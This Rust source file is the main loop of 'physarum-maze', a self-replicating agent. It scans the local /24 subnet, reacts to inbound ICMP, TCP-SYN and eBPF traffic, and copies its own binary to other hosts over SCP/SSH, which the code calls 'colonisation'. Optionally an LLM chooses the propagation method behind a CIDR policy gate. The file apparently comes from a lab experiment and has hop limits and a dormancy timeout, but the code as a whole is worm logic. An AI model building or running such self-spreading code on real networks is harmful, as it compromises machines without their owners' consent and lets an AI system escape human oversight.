/// Main agent event loop — Issue #126 adaptive sensing edition.
///
/// Two organic stimulus paths — no external harness required:
///
/// Path A — Startup sensing (every 180 s, first tick fires immediately):
///   discovery_ticker fires
///     → startup_sweep(/24 of local interface, STARTUP_SWEEP_PORTS)
///     → for each discovered host → handle_candidate(ip, "startup-sensing")
///     → llm_loop::run (SensingProfile::StartupLocalDiscovery)
///     → DiscoveryQuery → LLM → PolicyGate → LlmAttemptEvidence → lineage
///
/// Path B — Runtime stimulus (ICMP / TCP-SYN / eBPF):
///   raw socket / eBPF observer detects inbound packet
///     → handle_candidate(ip, "icmp" | "tcp-syn" | "ebpf")
///     → llm_loop::run (RuntimeIcmpFast or RuntimeTcpEbpfFast)
///     → DiscoveryQuery → LLM → PolicyGate → LlmAttemptEvidence → lineage
///
/// When LLM is not configured (no --llm-endpoint), the agent falls back to
/// the SSH-propagation path (port-22 probe → SCP/SSH colonisation).
use crate::{
    lineage::Lineage,
    llm_loop::{self, LlmOutcome},
    propagation::{self, Outcome},
    Cli, Mode,
};
use anyhow::Result;
use physarum_llm::{MockLlmClient, OpenAiCompatibleClient, PolicyGate, PropagationMethodClass};
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::path::Path;
use std::str::FromStr;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio::time::timeout;

/// Resolved LLM configuration — None means LLM is disabled.
struct LlmConfig {
    client: Arc<dyn physarum_llm::LlmClient>,
    gate: PolicyGate,
}

impl LlmConfig {
    fn from_cli(cli: &Cli) -> Option<Self> {
        let endpoint = cli.llm_endpoint.as_deref()?;

        let allowed_cidrs = parse_cidr(cli.llm_allowed_cidr.as_deref()).unwrap_or_default();

        let mut gate = PolicyGate::lab_default();
        gate.allowed_cidrs = allowed_cidrs;

        let allowed_methods = vec![
            PropagationMethodClass::Ssh,
            PropagationMethodClass::Http,
            PropagationMethodClass::NoPath,
        ];

        let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
            Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
        } else if endpoint == "mock-http" {
            Arc::new(MockLlmClient::http_probe_with_plan("/", 0.9))
        } else {
            let api_key = cli.llm_api_key.clone().unwrap_or_default();
            match OpenAiCompatibleClient::new(
                endpoint,
                &cli.llm_model,
                api_key,
                cli.llm_timeout_ms,
                allowed_methods,
                cli.llm_log_prompts,
            ) {
                Ok(c) => Arc::new(c),
                Err(e) => {
                    tracing::warn!(err = %e, "failed to build LLM client — LLM disabled");
                    return None;
                }
            }
        };

        tracing::info!(
            endpoint,
            model = %cli.llm_model,
            cidrs = ?cli.llm_allowed_cidr,
            "LLM reasoning enabled"
        );

        Some(LlmConfig { client, gate })
    }
}

fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
    let cidr = cidr?;
    let (ip_str, prefix_str) = cidr.split_once('/')?;
    let ip = std::net::Ipv4Addr::from_str(ip_str).ok()?;
    let prefix = prefix_str.parse::<u8>().ok()?;
    Some(vec![(ip, prefix)])
}

pub async fn run(cli: Cli) -> Result<()> {
    let llm = LlmConfig::from_cli(&cli);
    let mut lineage = init_lineage(&cli)?;
    lineage.save()?;

    if lineage.hops >= cli.max_hops {
        tracing::warn!(
            hops = lineage.hops,
            max = cli.max_hops,
            "max hops reached — dormant"
        );
        return Ok(());
    }

    let binary_path = std::env::current_exe()?;
    let local_ip = resolve_local_ip(&cli, &lineage);

    let mut icmp_rx = crate::icmp::start(cli.interface.clone());
    let mut tcp_rx = crate::tcp::start(cli.interface.clone());
    let mut ebpf_rx: Option<mpsc::Receiver<Ipv4Addr>> = init_ebpf(&cli);
    let mut discovery_ticker =
        tokio::time::interval(Duration::from_secs(cli.discovery_interval_secs));
    let mut attempted: HashSet<Ipv4Addr> = HashSet::new();

    let stimulus_timeout = Duration::from_secs(cli.stimulus_timeout_secs);
    let mut dormant_at = tokio::time::Instant::now() + stimulus_timeout;

    tracing::info!(
        mode                 = ?cli.mode,
        hops                 = lineage.hops,
        origin               = %lineage.origin,
        path                 = ?lineage.path,
        local                = ?local_ip.map(|ip| ip.to_string()),
        discovery_interval_s = cli.discovery_interval_secs,
        "physarum-maze agent ready — startup sweep on first tick"
    );

    loop {
        tokio::select! {
            // ── ICMP echo-request stimulus ────────────────────────────────
            maybe_ip = icmp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                    None => {
                        tracing::info!("ICMP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── TCP SYN stimulus ──────────────────────────────────────────
            maybe_ip = tcp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                    None => {
                        tracing::info!("TCP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── Startup/periodic /24 sweep (Path A) ───────────────────────
            _ = discovery_ticker.tick() => {
                if let Some(my_ip) = local_ip {
                    let candidates = crate::discovery::startup_sweep(my_ip).await;
                    tracing::info!(
                        found = candidates.len(),
                        local = %my_ip,
                        "startup sweep complete"
                    );
                    if !candidates.is_empty() {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                    }
                    for ip in candidates {
                        handle_candidate(
                            ip, "startup-sensing", &mut lineage, &binary_path,
                            &mut attempted, &llm,
                        ).await?;
                    }
                }
            }

            // ── eBPF inbound connection stimulus ──────────────────────────
            maybe_ebpf = async {
                if let Some(rx) = ebpf_rx.as_mut() {
                    rx.recv().await
                } else {
                    std::future::pending::<Option<Ipv4Addr>>().await
                }
            } => {
                match maybe_ebpf {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                    None => {
                        tracing::info!("eBPF channel closed");
                        ebpf_rx = None;
                    }
                }
            }

            // ── Stimulus timeout ──────────────────────────────────────────
            _ = tokio::time::sleep_until(dormant_at) => {
                tracing::info!(
                    secs = cli.stimulus_timeout_secs,
                    "no stimulus — going dormant"
                );
                break;
            }
        }
    }

    tracing::info!(
        hops              = lineage.hops,
        path              = ?lineage.path,
        scores            = ?lineage.scores,
        secondary_conduits = ?lineage.secondary_conduits,
        "physarum-maze shutting down"
    );
    Ok(())
}

/// Process one candidate IP regardless of which stimulus source produced it.
///
/// Guard order:
///   1. Cycle guard — skip if IP is already in the lineage path.
///   2. Dead-end guard — skip passive probes against known dead ends;
///      active stimuli (ICMP/TCP/eBPF) clear the mark and re-validate.
///   3. Colonised guard — skip already-colonised hosts.
///   4. Session dedup — skip IPs already attempted this run.
///
/// Decision order when guards pass:
///   A. LLM configured → llm_loop::run (adaptive profile from stimulus).
///   B. LLM absent → port-22 probe → SSH/SCP propagation fallback.
async fn handle_candidate(
    src_ip: Ipv4Addr,
    stimulus: &str,
    lineage: &mut Lineage,
    binary_path: &Path,
    attempted: &mut HashSet<Ipv4Addr>,
    llm: &Option<LlmConfig>,
) -> Result<()> {
    let ip_str = src_ip.to_string();

    // ── Guards ────────────────────────────────────────────────────────────
    if lineage.is_visited(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already in lineage path — loop guard, skip");
        return Ok(());
    }
    if lineage.is_dead_end(&ip_str) {
        match stimulus {
            "startup-sensing" | "discovery" => {
                tracing::debug!(%src_ip, stimulus, "known dead end — skip passive probe");
                return Ok(());
            }
            _ => {
                // Active stimulus: host is signalling — environment may have changed.
                tracing::info!(%src_ip, stimulus, "dead-ended host sent active stimulus — revalidating");
                lineage.unmark_dead_end(&ip_str);
                attempted.remove(&src_ip);
            }
        }
    }
    if lineage.is_colonized(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already colonized — skip");
        return Ok(());
    }
    if !attempted.insert(src_ip) {
        tracing::debug!(%src_ip, stimulus, "already attempted this session — skip");
        return Ok(());
    }

    tracing::info!(%src_ip, stimulus, "candidate accepted — starting evidence pipeline");

    // ── Path A: LLM reasoning (all stimuli when LLM is configured) ────────
    if let Some(cfg) = llm {
        match llm_loop::run(src_ip, stimulus, lineage, cfg.client.as_ref(), &cfg.gate).await? {
            LlmOutcome::Propagated => {
                tracing::info!(%src_ip, "LLM propagation succeeded");
                lineage.save()?;
                return Ok(());
            }
            LlmOutcome::DeadEnd => {
                tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
                lineage.mark_dead_end(&ip_str);
                lineage.save()?;
                return Ok(());
            }
        }
    }

    // ── Path B: SSH fallback (no LLM) ─────────────────────────────────────
    tracing::info!(%src_ip, stimulus, "confirming SSH on port 22 (no LLM configured)");
    if !port_22_open(src_ip).await {
        tracing::warn!(%src_ip, "port 22 not open — dead end");
        lineage.mark_dead_end(&ip_str);
        lineage.save()?;
        return Ok(());
    }

    crate::discovery::scan_targeted(src_ip);

    let next_lineage = lineage.extend(&ip_str);
    let next_b64 = next_lineage.to_b64()?;

    tracing::info!(%src_ip, hops = next_lineage.hops, "propagating via SSH");

    match propagation::propagate(src_ip, binary_path, &next_b64).await? {
        Outcome::Success => {
            tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
            *lineage = next_lineage;
            lineage.save()?;
        }
        Outcome::AlreadyColonized => {
            tracing::info!(%src_ip, "already colonized — recording secondary conduit");
            let from = lineage
                .path
                .last()
                .cloned()
                .unwrap_or_else(|| lineage.origin.clone());
            lineage.mark_colonized(&ip_str);
            lineage.add_secondary_conduit(&from, &ip_str);
            lineage.save()?;
        }
        Outcome::ScpFailed => {
            tracing::warn!(%src_ip, "SCP failed — dead end");
            lineage.mark_dead_end(&ip_str);
            lineage.save()?;
        }
        Outcome::SshFailed => {
            tracing::warn!(%src_ip, "SSH launch failed — penalizing edge");
            lineage.penalize(&ip_str);
            lineage.save()?;
        }
    }

    Ok(())
}

fn init_lineage(cli: &Cli) -> Result<Lineage> {
    match &cli.mode {
        Mode::Seed => {
            let my_ip = local_ip(&cli.interface)?;
            tracing::info!(%my_ip, iface = %cli.interface, "seed mode");
            Ok(Lineage::seed(&my_ip.to_string()))
        }
        Mode::Propagated => {
            let b64 = cli
                .lineage_b64
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("--lineage-b64 required in propagated mode"))?;
            let lin = Lineage::from_b64(b64)?;
            tracing::info!(
                hops   = lin.hops,
                origin = %lin.origin,
                path   = ?lin.path,
                "propagated mode — lineage received"
            );
            Ok(lin)
        }
    }
}

/// Resolve the local IPv4 address used for /24 startup sweep.
///
/// Seed mode: read from the NIC.
/// Propagated mode: the last IP in the lineage path is the current host.
fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
    match &cli.mode {
        Mode::Seed => local_ip(&cli.interface).ok(),
        Mode::Propagated => lineage.path.last().and_then(|s| s.parse::<Ipv4Addr>().ok()),
    }
}

/// TCP connect probe — confirms port 22 is open and accepting connections.
/// Used only in the SSH fallback path (no LLM configured).
async fn port_22_open(ip: Ipv4Addr) -> bool {
    match timeout(Duration::from_secs(5), TcpStream::connect((ip, 22u16))).await {
        Ok(Ok(_)) => {
            tracing::debug!(%ip, "port 22 open");
            true
        }
        Ok(Err(e)) => {
            tracing::debug!(%ip, error = %e, "port 22 refused");
            false
        }
        Err(_) => {
            tracing::debug!(%ip, "port 22 timeout");
            false
        }
    }
}

/// Initialize the optional eBPF stimulus receiver.
fn init_ebpf(cli: &Cli) -> Option<mpsc::Receiver<Ipv4Addr>> {
    #[cfg(target_os = "linux")]
    if let Some(ref path) = cli.bpf_bytecode {
        match crate::ebpf::start(path) {
            Ok(rx) => {
                tracing::info!(?path, "eBPF stimulus enabled");
                return Some(rx);
            }
            Err(e) => {
                tracing::warn!(err = %e, "eBPF stimulus init failed — continuing without eBPF");
            }
        }
    }
    let _ = cli;
    None
}

/// Determine the IPv4 address assigned to `interface`.
fn local_ip(interface: &str) -> anyhow::Result<Ipv4Addr> {
    for iface in if_addrs::get_if_addrs()? {
        if iface.name == interface {
            if let if_addrs::IfAddr::V4(v4) = iface.addr {
                return Ok(v4.ip);
            }
        }
    }
    anyhow::bail!("no IPv4 address found for interface '{}'", interface)
}
